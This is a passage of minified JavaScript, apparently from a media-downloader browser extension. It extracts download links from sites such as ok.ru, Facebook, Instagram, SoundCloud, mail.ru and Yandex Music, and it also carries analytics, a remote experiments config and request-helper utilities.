o()}),!0}},{key:"getOkMetadata",value:function(e,t){var r=e.url;return r?(Object(p.a)({method:"POST",url:r,json:!0},function(e,r,n){if(e||!n)return t();t(n)}),!0):t()}},{key:"getOkViaMobile",value:function(e,t){var r=e.metadata,n={"st.cmd":"movieLayer","st.mvId":e.mvId},o="http://m.ok.ru/dk?"+Oe.stringify(n),i={action:e.action,links:null,title:r.movie.title};return Object(p.a)({url:o},function(n,o,a){if(n||!a)return t();var s=new RegExp('href="([^"]+st\\.cmd=moviePlaybackRedirect[^"]+st\\.mvid='+e.mvId+'[^"]+)"'),u=a.match(s);if(!(u=u&&u[1]))return t();if(u=$.decodeSpecialChars(u),i.links=[{url:u}],!/st.mq=\d+/.test(u))return t(i);var c=r.videos;if(!c||!c.length)return t(i);c.forEach(function(e){if(e.url){var t=q(e.url);t.type&&(e.url=u.replace(/(st.mq=)\d+/,"$1"+t.type))}}),i.links=c,t(i)}),!0}},{key:"okDirectOrMobile",value:function(e,t){var r=this,n=e.metadata,o=null;n.videos&&n.videos.some(function(e){if(e.url)return o=e.url,!0});var i=function(){e.action="getOkViaMobile",r.getOkViaMobile(e,t)};return o?(Object(p.a)({url:o,type:"HEAD"},function(r){return r?i():(e.action="getOkViaMobileNoWrap",e.links=n.videos,t(e))}),!0):(i(),!0)}},{key:"okRequestVideoPage",value:function(e){var t=e.videoId;return R({url:"https://ok.ru/video/".concat(t),headers:{"user-agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"}}).then(function(e){return e.body})}}]),e}(),Le=function(){function e(t){Object(w.a)(this,e),this.engine=t}return Object(x.a)(e,[{key:"getFacebookLinks",value:function(e,t){return this._getFacebookLinks(e.extVideoId,function(r,n,o,i){var a={action:e.action,extVideoId:e.extVideoId,links:r||null,title:n||"",thumb:o||"",duration:i||""};t(a)}),!0}},{key:"getFacebookLinksFromData",value:function(e,t){var r=e.data,n=e.extVideoId;return this.getLinksFromData2(r,n,!0,function(r,n,o,i){var a={action:"getFacebookLinksFromData",extVideoId:e.extVideoId,links:r||null,title:n||"",thumb:o||"",duration:i||""};t(a)})}},{key:"_getFacebookLinks",value:function(e,t){var r=this;Object(p.a)({type:"GET",url:"https://www.facebook.com/video.php?v="+e,headers:{Cookie:""}},function(n,o,i){if(n||!i)return t();r.getLinksFromData(i,e,t)})}},{key:"getLinksFromData",value:function(e,t,r){var n=this,o=e.match(/\["params","([^"]*)"\]/im);if(!o)return this.getLinksFromData2(e,t,!1,r);var i=null;try{if((i=JSON.parse(decodeURIComponent(JSON.parse('"'+o[1]+'"'))).video_data).progressive&&(i=i.progressive),!i)return r()}catch(e){return r()}var a=null,s=null,u=[],c={sd_src:"SD",hd_src:"HD"};Array.isArray(i)||(i=[i]);for(var l,f=0;l=i[f];f++)["sd_src","hd_src"].forEach(function(e){if(l.thumbnail_src&&(a=l.thumbnail_src),l.video_duration&&(s=l.video_duration),l[e]){var t=n.getFileExtension(l[e],"mp4");u.push({url:l[e],name:c[e],type:t,ext:t.toUpperCase()})}});r(u,"",a,s)}},{key:"getLinksFromData2",value:function(e,t,r,n){var o=null,i=function(e){return e.split(/"?videoData"?:\[/).some(function(e){return N(e).some(function(e){if((e.sd_src||e.hd_src)&&String(e.video_id)===String(t))return o=e,!0})})};if(r?i(e):k(e,[/"?videoData"?:\[/]).some(i),!o)return n();var a,s=[];return o.sd_src&&(a=this.getFileExtension(o.sd_src,"mp4"),s.push({url:o.sd_src,name:"SD",type:a,ext:a.toUpperCase()})),o.hd_src&&(a=this.getFileExtension(o.hd_src,"mp4"),s.push({url:o.hd_src,name:"HD",type:a,ext:a.toUpperCase()})),n(s,"",o.thumbnail_src,o.video_duration)}},{key:"getFileExtension",value:function(e,t){var r=e.match(/\.([a-z0-9]{3,4})(\?|$)/i);return r?(r=r[1]).toLowerCase():t||""}},{key:"getFacebookPhotoUrl",value:function(e,t){return e.fbid?(Object(p.a)({url:"https://www.facebook.com/photo.php?fbid="+e.fbid},function(e,r,n){if(e||!n)return t();if(i=n.match(/<a[^>]+fbPhotosPhotoActionsItem[^>]+href="([^">]+dl=1)"[^>]+>/i)){var o=i[1].replace(/&amp;/g,"&");return t([o])}var i,a=[],s={};return(i=n.match(/(<a[^>]+rel="theater"[^>]+>)/gi))&&i.forEach(function(e){var t=e.match(/data-pl[os]i="[^"]+"/gi);t&&t.forEach(function(e){var t=e.indexOf("=");if(-1!==t){var r=e.substr(0,t),n=e.substr(t+1);n=n.substr(1,n.length-2).replace(/&amp;/g,"&"),s[r]=n,a.push(n)}})}),s["data-ploi"]?t([s["data-ploi"]]):t(a)}),!0):t()}}]),e}(),Se=function(){function e(t){Object(w.a)(this,e),this.engine=t}var t;return Object(x.a)(e,[{key:"ffInstagramDownloadMedia",value:(t=i(d.a.mark(function e(t){var r,n,o,i,a;return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:return r=t.downloadFileUrl,n=t.filename,e.next=3,fetch(r,{headers:{"User-Agent":"curl/7.64.1"}});case 3:return o=e.sent,e.next=6,o.blob();case 6:i=e.sent,a=URL.createObjectURL(i),this.engine.utils.downloadFile({options:{filename:n,url:a}});case 9:case"end":return e.stop()}},e,this)})),function(e){return t.apply(this,arguments)})}]),e}();function Ce(e,t){(null==t||t>e.length)&&(t=e.length);for(var r=0,n=new Array(t);r<t;r++)n[r]=e[r];return n}function Ee(e,t){Ee=function(e,t){return new i(e,void 0,t)};var r=A(RegExp),n=RegExp.prototype,o=new WeakMap;function i(e,t,n){var i=r.call(this,e,t);return o.set(i,n||o.get(e)),i}function a(e,t){var r=o.get(t);return Object.keys(r).reduce(function(t,n){return t[n]=e[r[n]],t},Object.create(null))}return Object(S.a)(i,r),i.prototype.exec=function(e){var t=n.exec.call(this,e);return t&&(t.groups=a(t,this)),t},i.prototype[Symbol.replace]=function(e,t){if("string"==typeof t){var r=o.get(this);return n[Symbol.replace].call(this,e,t.replace(/\$<([^>]+)>/g,function(e,t){return"$"+r[t]}))}if("function"==typeof t){var i=this;return n[Symbol.replace].call(this,e,function(){var e=[];return e.push.apply(e,arguments),"object"!=typeof e[e.length-1]&&e.push(a(e,i)),t.apply(this,e)})}return n[Symbol.replace].call(this,e,t)},Ee.apply(this,arguments)}var Me=function(){function e(t){Object(w.a)(this,e);var r=T(t,Ee(/#EXTINF:[\s\S]*?,\n([\s\S]*?)$/gm,{url:1}));this.urls=[];var n,o=function(e,t){var r;if("undefined"==typeof Symbol||null==e[Symbol.iterator]){if(Array.isArray(e)||(r=function(e,t){if(e){if("string"==typeof e)return Ce(e,t);var r=Object.prototype.toString.call(e).slice(8,-1);return"Object"===r&&e.constructor&&(r=e.constructor.name),"Map"===r||"Set"===r?Array.from(e):"Arguments"===r||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r)?Ce(e,t):void 0}}(e))||t&&e&&"number"==typeof e.length){r&&(e=r);var n=0,o=function(){};return{s:o,n:function(){return n>=e.length?{done:!0}:{done:!1,value:e[n++]}},e:function(e){throw e},f:o}}throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}var i,a=!0,s=!1;return{s:function(){r=e[Symbol.iterator]()},n:function(){var e=r.next();return a=e.done,e},e:function(e){s=!0,i=e},f:function(){try{a||null==r.return||r.return()}finally{if(s)throw i}}}}(r);try{for(o.s();!(n=o.n()).done;){var i=n.value;i.groups&&i.groups.url?this.urls.push(i.groups.url):i[1]&&this.urls.push(i[1])}}catch(e){o.e(e)}finally{o.f()}}return Object(x.a)(e,[{key:"changeURLs",value:function(e){this.urls=this.urls.map(e)}},{key:"_downloadTask",value:function(e){return fetch(e).then(function(e){if(e.ok)return e.blob();throw new Error("bad response")})}},{key:"download",value:function(){var e=this,t=this.urls.map(function(t){return e._downloadTask(t)});return Promise.all(t).then(function(e){var t=new Blob(e,{type:e[0].type});return URL.createObjectURL(t)})}},{key:"fetchMimeType",value:function(){return fetch(this.urls[0],{method:"head"}).then(function(e){return e.headers.get("Content-Type")})}},{key:"_emit",value:function(e,t){var r=new CustomEvent("hlsDownloader."+e,{detail:t});document.dispatchEvent(r)}}],[{key:"createFromURL",value:function(t){return R(t).then(function(t){return new e(t.body)})}}]),e}(),Ie=r(9),Ae=r.n(Ie),Re=Object(m.a)("soundcloud_com_embed"),Ve=function(){function e(t){Object(w.a)(this,e),this.engine=t}var t,r,n,o,a;return Object(x.a)(e,[{key:"soundcloudFetchPageInfo",value:(a=i(d.a.mark(function e(t){var r,n,o,i,a;return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:return r=t.clientId,n=t.songEndpoint,o=t.retry,i=void 0===o?3:o,e.prev=1,a="https://api-widget.soundcloud.com/resolve?"+Ae.a.stringify({client_id:r,url:n,format:"json"}),e.next=5,R({url:a,json:!0});case 5:return e.abrupt("return",e.sent.body);case 8:if(e.prev=8,e.t0=e.catch(1),Re.error("FetchPageInfoError",e.t0),!i){e.next=12;break}return e.abrupt("return",(i--,this.soundcloudFetchPageInfo({clientId:r,songEndpoint:n,retry:i})));case 12:throw e.t0;case 13:case"end":return e.stop()}},e,this,[[1,8]])})),function(e){return a.apply(this,arguments)})},{key:"soundcloudFetchSongsOfPlaylist",value:(o=i(d.a.mark(function e(t){var r,n,o,i,a,s,u,c,f,h,p;return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:if(r=t.clientID,n=t.playlist,o=n.tracks.map(function(e){return e.id}),i=[],a=[],o.length>=30)for(s=0;s<o.length;s+=30)i.push(o.slice(s,s+30));else i.push(o);u=0,c=i;case 4:if(!(u<c.length)){e.next=14;break}return f=c[u],h="https://api-v2.soundcloud.com/tracks?ids=".concat(f.join(","),"&client_id=").concat(r),e.next=9,R({url:h,json:!0});case 9:p=e.sent,a.push.apply(a,l(p.body));case 11:u++,e.next=4;break;case 14:return e.abrupt("return",a);case 15:case"end":return e.stop()}},e)})),function(e){return o.apply(this,arguments)})},{key:"soundcloudSearchBestDownloadURL",value:(n=i(d.a.mark(function e(t){var r,n,o,i;return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:if(r=t.song,n=t.clientID,r.media&&r.media.transcodings&&r.media.transcodings.length){e.next=3;break}return e.abrupt("return");case 3:return o=r.media.transcodings,e.next=6,this._searchProgressiveTranscoding(n,o);case 6:return i=e.sent,e.abrupt("return",i||this._searchHlsTranscoding(n,o));case 8:case"end":return e.stop()}},e,this)})),function(e){return n.apply(this,arguments)})},{key:"_searchProgressiveTranscoding",value:(r=i(d.a.mark(function e(t,r){var n;return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:if(!(n=r.find(function(e){return"progressive"===e.format.protocol}))){e.next=5;break}return e.next=4,R({url:n.url+"?client_id="+t,json:!0});case 4:return e.abrupt("return",e.sent.body.url);case 5:case"end":return e.stop()}},e)})),function(e,t){return r.apply(this,arguments)})},{key:"_searchHlsTranscoding",value:(t=i(d.a.mark(function e(t,r){var n,o,i;return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:return n=r.find(function(e){return"hls"===e.format.protocol}),e.next=3,R({url:n.url+"?client_id="+t,json:!0});case 3:return o=e.sent,e.next=6,R(o.body.url);case 6:return i=e.sent.body,e.abrupt("return",new Me(i).download());case 8:case"end":return e.stop()}},e)})),function(e,r){return t.apply(this,arguments)})}]),e}(),_e=Object(m.a)("match_tv_embed"),Te=function(){function e(t){Object(w.a)(this,e),this.engine=t}var t;return Object(x.a)(e,[{key:"matchTvFetchVideoSources",value:(t=i(d.a.mark(function e(t){var r,n,o,i,a,s,u,c,l;return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:if(r=t.iframeVideoURL,e.prev=1,n=r.match(/\d+/),o=n&&n[0]){e.next=5;break}return e.abrupt("return",[]);case 5:return i="https://matchtv.ru/vdl/playlist/".concat(encodeURIComponent(o),"/1.json"),e.next=8,R({url:i,json:!0});case 8:a=e.sent.body,s=[],u=0;case 11:if(!(u<a.length)){e.next=20;break}return c=a[u],e.next=15,R(c.src);case 15:(l=e.sent.body.match(/^http.*?$/m))&&s.push({endpoint:l[0],title:c.label});case 17:u++,e.next=11;break;case 20:return e.abrupt("return",s);case 23:return e.prev=23,e.t0=e.catch(1),e.abrupt("return",(_e.error("get videos error",e.t0),[]));case 26:case"end":return e.stop()}},e,null,[[1,23]])})),function(e){return t.apply(this,arguments)})}]),e}(),Pe=function(){function e(t){Object(w.a)(this,e),this.engine=t}var t;return Object(x.a)(e,[{key:"showjetFetchMovie",value:(t=i(d.a.mark(function e(t){var r,n,o,i,a,s,u;return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:return r=t.iframeVideoURL,e.next=3,R(r);case 3:if(n=e.sent,o=xe(n.body),N(n.body).some(function(e){if(e.hls)return i=e.hls,!0}),i){e.next=7;break}return e.abrupt("return",[]);case 7:return e.next=9,R(i);case 9:return a=e.sent.body,s=i.split("/").slice(0,-1).join("/"),u=T(a,/RESOLUTION=(.*?),.*\n(.*?\.m3u8$)/gm),e.abrupt("return",u=u.map(function(e){return{filename:o.title,title:e[1],endpoint:s+"/"+e[2]}}));case 13:case"end":return e.stop()}},e)})),function(e){return t.apply(this,arguments)})}]),e}(),Fe=function(){function e(t){Object(w.a)(this,e),this.engine=t}return Object(x.a)(e,[{key:"getMailruLinks",value:function(e,t){return this._getMailruLinks(e.extVideoId,function(r,n,o,i,a){var s={action:e.action,extVideoId:i||e.extVideoId,links:r,title:n,thumb:o,duration:a};t(s)}),!0}},{key:"_getMailruLinks",value:function(e,t){var r,n=this,o=e,i=e.match(/\/([^\/]+)\/([^\/]+)\/video\/(.+).html/);if(i||(i=e.match(/embed\/([^\/]+)\/([^\/]+)\/(.+).html/)),i&&(r="http://api.video.mail.ru/videos/"+i[1]+"/"+i[2]+"/"+i[3]+".json",o=i[1]+"/"+i[2]+"/video/"+i[3]+".html"),r)return this.onGetMailruMetadataUrl(r,o,t);Object(p.a)({url:"http://my.mail.ru/"+e},function(e,i,a){if(e||!a)return t();var s=/"metaUrl":/,u=null;if(k(a,s).some(function(e){return O(e,s).some(function(e){if(e.metaUrl)return u=e,!0})}),u)return r=u.metaUrl,void n.onGetMailruMetadataUrl(r,o,t);if(!(a=a.match(/<meta\s+content="[^"]+(videoapi\.my\.mail[^&]+)&[^"]+"[^>]+\/>/)))return t();var c=(a=decodeURIComponent(a[1])).substr(a.lastIndexOf("/")+1);r="http://videoapi.my.mail.ru/videos/"+c+".json",n.onGetMailruMetadataUrl(r,o,t)})}},{key:"onGetMailruMetadataUrl",value:function(e,t,r){var n=this;this.getMailruMetadata(e,function(e){if(!e||"string"==typeof e)return r();n.readMailruMetadata(e,function(e,o,i,a){r(n.prepMailruLinks(e),o,i,t,a)})})}},{key:"prepMailruLinks",value:function(e){if(e){for(var t,r=[],n=0;t=e[n];n++){var o=t.url,i="FLV";-1!==o.indexOf(".mp4")&&(i="MP4"),-1!==o.indexOf(".mov")&&(i="MOV"),-1!==o.indexOf(".mpg")&&(i="MPG"),t.quality||(t.quality="-?-");var a=t.quality.toUpperCase(),s=["1080P","720P","480P","360P","272P"].indexOf(a);-1!==s&&(a=["1080","720","480","360","272"][s]);var u=i.toLowerCase();r.push({url:o,subname:a,name:i,ext:u})}return r.sort(function(e,t){return"HD"===e.subname?1:e.subname>t.subname}),r}}},{key:"getMailruMetadata",value:function(e,t){if(!e)return t();Object(p.a)({url:e,json:!0},function(e,r,n){if(e||!n)return t();t(n)})}},{key:"readMailruMetadata",value:function(e,t){var r,n=[],o=void 0,i=void 0;if(e.meta&&(i=e.meta.poster,o=e.meta.duration),"UPLOADED"===e.provider){if(r=e.movie?e.movie.title:void 0,!e.videos)return t();e.videos.forEach(function(e){n.push({quality:e.name,url:e.url,title:r})})}else if("ugc"===e.provider){if(r=e.meta?e.meta.title:void 0,!e.videos)return t();e.videos.forEach(function(e){n.push({quality:e.key,url:e.url,title:r})})}else if("pladform"===e.provider)return r=e.meta?e.meta.title:void 0,void this.engine.modules.odnoklassniki.getPladformVideo({extVideoId:{playerId:e.meta.playerId,videoId:e.meta.videoId}},function(e){if(!e)return t();"getRutubeLinks"===e.action&&(e.links=null);var n=e.links;if(!n)return t();n.forEach(function(e){void 0===e.title&&(e.title=r)}),t(n,r,i,o)});return 0===n.length?t():t(n,r,i,o)}}]),e}();function De(e,t){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter(function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable})),r.push.apply(r,n)}return r}function Ue(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?De(Object(r),!0).forEach(function(t){n(e,t,r[t])}):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):De(Object(r)).forEach(function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))})}return e}var qe=function(e,t,r){return"https://".concat(e,"/api/v2.1/handlers/track/").concat(t,":").concat(r,"/web-home_new-chart-track-saved/download/m?hq=0&external-domain=music.yandex.ru&overembed=no&__t=").concat(Date.now())},Ne=function(e,t,r,n,o){return"https://".concat(e,"/get-mp3/").concat(t,"/").concat(r,"/").concat(n,"?track-id=").concat(o,"&play=false")},Be=function(){function e(t){Object(w.a)(this,e)}var t;return Object(x.a)(e,[{key:"yandexGetTrack",value:(t=i(d.a.mark(function e(t){var r,n,o,i,a,s,u,c,f,h,p,m,v,y,g,b,w,x;return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:return r=t.album,n=t.trackId,o=t.uid,i=t.currentPage,a={headers:{accept:"application/json","X-Current-UID":o,"X-Retpath-Y":(i=new URL(i)).toString()},json:!0,withCredentials:!0},e.next=4,R(Ue({url:qe(i.host,n,r)},a));case 4:return s=e.sent,u=s.body,c=u.src,f=u.codec,h=u.bitrate,p=-1===c.indexOf("https:")?"https:"+c:c,m=new URL(p),[["track_id",n],["format","json"]].forEach(function(e){var t;return(t=m.searchParams).append.apply(t,l(e))}),e.next=14,R(Ue({url:m.toString()},a));case 14:return v=e.sent,y=v.body,g=y.host,b=y.ts,w=y.path,x=y.s,e.abrupt("return",{bitrate:h,codec:f,downloadURL:Ne(g,x,b,w,n)});case 21:case"end":return e.stop()}},e)})),function(e){return t.apply(this,arguments)})}]),e}(),He=r(38),$e=function(e){if("<all_urls>"===e)return"^https?:\\/\\/.+$";var t=e.match(/(\*|http|https|file|ftp):\/\/([^\/]+)(?:\/(.*))?/);if(!t)throw new Error("Invalid url-pattern");var r=t[1];"*"===r&&(r="https?");var n=t[2],o=["^",r,":\\/\\/",n="*"===n?".+":(n=(n=He(n)).replace(/^\\\*\\\./,"(?:[^/]+\\.)?")).replace(/\\\.\\\*$/g,"\\.[a-z\\.]{2,}")],i=t[3];return i?"*"===i?(i="(?:|/.*)",o.push(i),o.push("$")):i&&(i=(i=He(i="/"+i)).replace(/\\\*/g,".*"),o.push(i),o.push("$")):o.push("$"),o.join("")},Ge=function(){return window.top!==window.self},Je={on:function(e,t,r,n){e.addEventListener(t,r,n)},off:function(e,t,r,n){e.removeEventListener(t,r,n)},one:function(e,t,r,n){var o=["oneFn",t,!!n].join("_"),i=r[o];i||(r[o]=i=function(e){Je.off(this,t,i,n),r.apply(this,arguments)}),Je.on(e,t,i,n),e=null}},We="sf-removed-"+Math.floor(1e6*Math.random()),ze="sf-notify-on-remove-"+Math.floor(1e6*Math.random());Je.onRemoveEventName=We,Je.onRemoveClassName=ze,Je.onRemoveListener=function(e){Je.trigger(e,We,{cancelable:!0,bubbles:!1})},Je.onRemoveEvent=function(e,t){e.classList.add(ze),e.addEventListener(We,t)},Je.offRemoveEvent=function(e,t){e.removeEventListener(Je.onRemoveEventName,t)},Je.trigger=function(e,t,r){var n;void 0===r&&(r={}),void 0===r.bubbles&&(r.bubbles=!1),void 0===r.cancelable&&(r.cancelable=!1),n="function"==typeof MouseEvent&&-1!==["click"].indexOf(t)?new MouseEvent(t,r):new CustomEvent(t,r),e.dispatchEvent(n)};var Ye=Je,Ke={create:function(e,t){var r,n;for(var o in r="object"!=typeof e?document.createElement(e):e,t){var i=t[o];(n=Ze[o])?n(r,i):r[o]=i}return r}},Ze={text:function(e,t){e.textContent=t},data:function(e,t){for(var r in t)e.dataset[r]=t[r]},class:function(e,t){if(Array.isArray(t))for(var r=0,n=t.length;r<n;r++)e.classList.add(t[r]);else e.setAttribute("class",t)},style:function(e,t){if("object"==typeof t)for(var r in t){var n=r;"float"===n&&(n="cssFloat");var o=t[r];if(Array.isArray(o))for(var i=0,a=o.length;i<a;i++)e.style[n]=o[i];else e.style[n]=o}else e.setAttribute("style",t)},append:function(e,t){Array.isArray(t)||(t=[t]);for(var r=0,n=t.length;r<n;r++){var o=t[r];(o||0===o)&&("object"!=typeof o&&(o=document.createTextNode(o)),e.appendChild(o))}},on:function(e,t){"object"!=typeof t[0]&&(t=[t]);for(var r=0,n=t.length;r<n;r++){var o=t[r];Array.isArray(o)&&Ye.on.apply(Ye,[e].concat(o))}},one:function(e,t){"object"!=typeof t[0]&&(t=[t]);for(var r=0,n=t.length;r<n;r++){var o=t[r];Array.isArray(o)&&Ye.one.apply(Ye,[e].concat(o))}},onCreate:function(e,t){t.call(e,e)},attr:function(e,t){var r,n;for(r in t)n=t[r],e.setAttribute(r,n)}},Qe=Ke,Xe=r(13),et=r(9),tt=Object(m.a)("amplitude"),rt=function(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:"bc3c8ed7b305f692ec048b0425b002df";return tt.debug("send",e),R({url:"https://api.amplitude.com/httpapi",method:"POST",contentType:"application/x-www-form-urlencoded",data:et.stringify({api_key:t,event:JSON.stringify(e)})}).catch(function(e){tt.error("amplitude error",e)})},nt=r(10),ot=function(){function e(t,r){if(Object(w.a)(this,e),this.browser=t.toLowerCase(),!(r="")){var n=navigator.language;r=n.indexOf("-")?n.split("-").shift():n}this.country=r.toLowerCase(),this.platform=navigator?navigator.platform.toLowerCase():null}return Object(x.a)(e,[{key:"getLanguage",value:function(){return window.navigator.language}},{key:"getPlatform",value:function(){var e=window.navigator.userAgent,t=window.navigator.platform;return-1!==["Macintosh","MacIntel","MacPPC","Mac68K"].indexOf(t)?"Mac OS":-1!==["iPhone","iPad","iPod"].indexOf(t)?"iOS":-1!==["Win32","Win64","Windows","WinCE"].indexOf(t)?"Windows":/Android/.test(e)?"Android":/Linux/.test(t)?"Linux":void 0}}]),e}(),it=r(14),at=function(){function e(){Object(w.a)(this,e)}return Object(x.a)(e,[{key:"get",value:function(e){return Object(nt.a)(e)}},{key:"first",value:function(e){return Object(nt.a)(e).then(function(t){return t[e]})}},{key:"set",value:function(e){return Object(it.a)(e)}}]),e}();function st(e,t){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter(function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable})),r.push.apply(r,n)}return r}function ut(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?st(Object(r),!0).forEach(function(t){n(e,t,r[t])}):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):st(Object(r)).forEach(function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))})}return e}var ct={enabled:!1,percent:10,countries:["all"],browsers:["all"],languages:["all"],platforms:["all"]},lt=["az","am","by","kg","kz","md","ru","tj","ua","uz"],ft={presetOnlyCIS:function(e){return lt.includes(e)},presetNotAllowCIS:function(e){return!lt.includes(e)}};function dt(e,t){var r,n=ut(ut({},ct),e),o=n.browsers,i=void 0===o?[]:o,a=n.countries,s=void 0===a?[]:a,u=n.languages,c=void 0===u?[]:u,l=n.platforms,f=void 0===l?[]:l,d=n.percent,h=function(e){return e.toLowerCase()},p=i.map(h).includes(t.browser)||i.includes("all");if(s.every(function(e){return Object.keys(ft).includes(e)})){var m=s[0];r=ft[m](t.country)}else r=s.map(h).includes(t.country)||s.includes("all");var v=c.map(h).find(function(e){return-1!==t.getLanguage().indexOf(e)})||c.includes("all"),y=f.map(h).includes(t.getPlatform().toLowerCase())||f.includes("all");return!!(n.enabled&&p&&r&&v&&y)&&function(e){return 100*Math.random()<=e}(d)}var ht=Object(m.a)("experiments"),pt={experiments:"experiments.main",config:"experiments.config"},mt=function(){function e(t){Object(w.a)(this,e),this.retryCount=0,this.storage=new at,this.config={payload:{},lastUpdated:null},this.user=void 0,this.user=t}var t,r;return Object(x.a)(e,[{key:"init",value:(r=i(d.a.mark(function e(){var t=this;return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:return e.prev=0,ht.info("ExperimentLoader init"),e.next=4,this._initPayload();case 4:e.next=13;break;case 12:return e.abrupt("return",{});case 13:return ht.info("list:",this.experiments,"config:",this.config),e.abrupt("return",this.experiments);case 17:e.prev=17,e.t0=e.catch(0),this.clearAll().then(function(){return t.retry()}),ht.error(e.t0);case 21:return e.abrupt("return",{});case 22:case"end":return e.stop()}},e,this,[[0,17]])})),function(){return r.apply(this,arguments)})},{key:"retry",value:function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:2;this.retryCount>=e||(this.retryCount++,ht.info("Retry loader"),this.init())}},{key:"_initPayload",value:(t=i(d.a.mark(function e(){var t,r;return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:return t=Object.keys(pt).map(function(e){return pt[e]}),e.next=3,this.storage.get(t);case 3:r=e.sent,this.experiments=r[pt.experiments]||{},this.config=r[pt.config]||this.config;case 6:case"end":return e.stop()}},e,this)})),function(){return t.apply(this,arguments)})},{key:"requestRemoteConfig",value:function(){var e="https://downloader-app.com/static/helper-config/experiments.config.json"+"?ts=".concat(Date.now());return R({url:e,json:!0}).then(function(e){return e.body})}},{key:"refreshExperiment",value:function(e){var t=this.config.payload[e]||{};return t.name=e,{name:e,config:t,allowed:dt(t,this.user),payload:t.payload}}},{key:"clearAll",value:function(){var e;return this.storage.set((n(e={},pt.config,null),n(e,pt.experiments,null),e))}}]),e}();Object(m.a)("ShareDistributor");var vt=function(e){e=e?e+"_":"";var t=Date.now();return e+Math.floor(1e12*(t-Math.floor(t))).toString(36)+Math.floor(1e12*Math.random()).toString(36)},yt=new Map;function gt(e){var t=yt.get(e);t&&(t.xhr&&t.xhr.abort(),yt.delete(e))}function bt(e){var t=e.split(/\r?\n/),r=[];return t.forEach(function(e){var t=e.indexOf(":");if(-1!==t){var n=e.substr(0,t).trim(),o=e.substr(t+1).trim();r.push([n,o])}}),r}Object(m.a)("televzrRemoteFn");var wt,xt,kt,Ot=r(9),jt=Object(m.a)("background"),Lt={isReady:!1,readyHandler:null};Lt.readyPromise=new Promise(function(e){return Lt.readyHandler=e}).then(function(){return Lt.isReady=!0}),Lt.utils=function(e){return g=e,b}(Lt),Lt.modules={},Lt.modules.vimeo=new L(Lt),Lt.modules.dailymotion=new U(Lt),Lt.modules.soundcloud=new Ve(Lt),Lt.modules.matchTv=new Te(Lt),Lt.modules.vkontakte=new ke(Lt),Lt.modules.odnoklassniki=new je(Lt),Lt.modules.facebook=new Le(Lt),Lt.modules.instagram=new Se(Lt),Lt.modules.mail_ru=new Fe(Lt),Lt.modules.showjet=new Pe(Lt),Lt.modules.yandex_music=new Be(Lt),h.a.remote=Object.assign(h.a.remote,{createRequest:function(e){var t=vt(e);return yt.set(t,{id:t,xhr:new XMLHttpRequest}),t},sendRequest:function(e){return new Promise(function(t,r){var n=yt.get(e.id),o=e.fetchOptions,i=n.xhr;for(var a in i.onload=function(){t({id:n.id,numChunks:Math.ceil(i.response.byteLength/16e6)||1,response:{ok:i.status>=200&&i.status<300,status:i.status,statusText:i.statusText,headers:bt(i.getAllResponseHeaders()||""),url:i.responseURL}})},i.onerror=i.ontimeout=function(){r(new TypeError("Network request failed"))},i.onabort=function(){r(new DOMException("Aborted","AbortError"))},i.responseType="arraybuffer",i.open(o.method||"GET",e.url,!0),o.headers)i.setRequestHeader(a,o.headers[a]);i.send()})},readRequestBodyChunk:function(e){return function(e){for(var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:0,r=arguments.length>2&&void 0!==arguments[2]?arguments[2]:1e99,n=[],o=Math.min(e.byteLength,t+r);t<o;t+=8192)n.push(String.fromCharCode.apply(null,new Uint8Array(e,t,Math.min(8192,o-t))));return n.join("")}(yt.get(e.id).xhr.response,16e6*e.chunkIndex,16e6)},clearRequest:gt,clearRequestByPrefix:function(e){Array.from(yt.keys()).filter(function(t){return-1!==t.indexOf(e)}).map(function(e){return gt(e)})}}),h.a.remote.getPreferences=function(){return Lt.readyPromise.then(function(){return 